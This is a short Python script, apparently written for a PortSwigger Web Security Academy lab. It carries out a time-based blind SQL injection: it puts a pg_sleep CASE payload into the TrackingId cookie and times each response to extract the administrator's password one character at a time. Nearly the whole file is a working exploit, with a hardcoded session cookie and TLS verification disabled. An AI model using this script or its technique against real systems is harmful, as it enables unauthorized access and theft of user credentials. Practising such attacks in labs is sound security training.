import requests
import time
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://0ae100f704cf69228173f27d002000a9.web-security-academy.net/"
session_cookie = "cHdLgX2eAswU92o2Uz6tgZbSfjRSDouP"
tracking_id = "vK0MJ1rFEBpFReKq"
caracteres = "abcdefghijklmnopqrstuvwxyz0123456789"
password = ""

print("Iniciando extracción de contraseña via time delay...")

for posicion in range(1, 21):
    for caracter in caracteres:
        payload = f"{tracking_id}';SELECT CASE WHEN (SUBSTRING(password,{posicion},1)='{caracter}') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--"
        cookies = {
            "TrackingId": payload,
            "session": session_cookie
        }
        inicio = time.time()
        response = requests.get(url, cookies=cookies, verify=False)
        tiempo = time.time() - inicio

        if tiempo > 8:
            password += caracter
            print(f"Posicion {posicion}: '{caracter}' → {password}")
            break

print(f"\nContraseña completa: {password}")
